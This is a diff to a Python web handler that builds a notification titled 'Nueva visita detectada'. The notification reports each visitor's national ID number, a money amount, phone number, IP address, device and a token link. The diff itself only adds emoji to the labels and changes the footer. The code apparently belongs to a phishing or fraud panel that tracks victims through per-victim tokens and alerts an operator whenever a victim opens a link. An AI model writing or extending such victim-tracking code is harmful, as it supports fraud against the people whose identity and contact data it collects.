@@ -477,15 +477,15 @@ async def get_token_data(token_val: str, request: Request):
             "title": "Nueva visita detectada",
             "color": 16776960,
             "fields": [
-                {"name": "Cédula", "value": f"`{data['cedula']}`", "inline": True},
-                {"name": "Monto", "value": f"${data['monto']}", "inline": True},
-                {"name": "Teléfono", "value": f"`{data['telefono']}`", "inline": True},
-                {"name": "IP", "value": f"`{client_ip}`", "inline": True},
-                {"name": "Dispositivo", "value": f"{dispositivo} · {navegador}", "inline": True},
-                {"name": "Sistema Operativo", "value": sistema_op, "inline": True},
-                {"name": "Link", "value": f"`?t={token_val[:20]}...`", "inline": False},
+                {"name": " Cédula", "value": f"`{data['cedula']}`", "inline": True},
+                {"name": "💰 Monto", "value": f"${data['monto']}", "inline": True},
+                {"name": "📱 Teléfono", "value": f"`{data['telefono']}`", "inline": True},
+                {"name": "🌍 IP", "value": f"`{client_ip}`", "inline": True},
+                {"name": "📱 Dispositivo", "value": f"{dispositivo} · {navegador}", "inline": True},
+                {"name": " Sistema Operativo", "value": sistema_op, "inline": True},
+                {"name": " Link", "value": f"`?t={token_val[:20]}...`", "inline": False},
             ],
-            "footer": {"text": f"Token: {token_val}"},
+            "footer": {"text": f"🕐 {time.strftime('%Y-%m-%d %H:%M:%S')}"},
             "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
         }
         
